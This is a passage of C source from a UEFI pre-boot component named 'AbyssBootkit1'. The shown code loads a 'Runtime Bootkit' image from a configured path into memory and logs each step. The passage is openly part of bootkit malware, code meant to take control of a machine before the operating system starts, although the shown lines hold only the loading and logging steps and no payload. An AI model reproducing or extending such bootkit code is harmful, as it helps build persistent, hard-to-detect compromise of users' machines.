		// -----------------------------------------------------------------------------------------------------------------
		// Load the Runtime Bootkit image into memory
		PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> PreBootSetup [Functions/Setup.c] (BootkitRuntime) - Load the Runtime Bootkit image into memory\r\n");

		Status = PreBootSetup_UtilsFiles_LoadImageFileIntoMemory(Global_PreBootConfiguration_FunctionsConfiguration_BootkitRuntimePath, &BootkitImageHandle);

		// Falied
		if (EFI_ERROR(Status))
		{
			PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELERROR, L"AbyssBootkit1 -> PreBootSetup [Functions/Setup.c] (BootkitRuntime) - PreBootSetup_UtilsFiles_LoadImageFileIntoMemory failed: %r (%llx)\r\n", Status, Status);
			return Status;
		}

		PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> PreBootSetup [Functions/Setup.c] (BootkitRuntime) - Runtime Bootkit loaded successfully\r\n");
	}
	else
	{
		PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELWARN, L"AbyssBootkit1 -> PreBootSetup [Functions/Setup.c] (BootkitRuntime) - StrCmp [Global_PreBootConfiguration_FunctionsConfiguration_BootkitRuntime] not TRUE.\r\n");
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Bye
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> PreBootSetup [Functions/Setup.c] (BootkitRuntime) - Bye\r\n");


	// ---------------------------------------------------------------------------------------------------------------------
	// Return
	return EFI_SUCCESS;
}



// --------------------------------------------------------------------------------------------------------------------------------------------
// --------------------------------------------------------------------------------------------------------------------------------------------
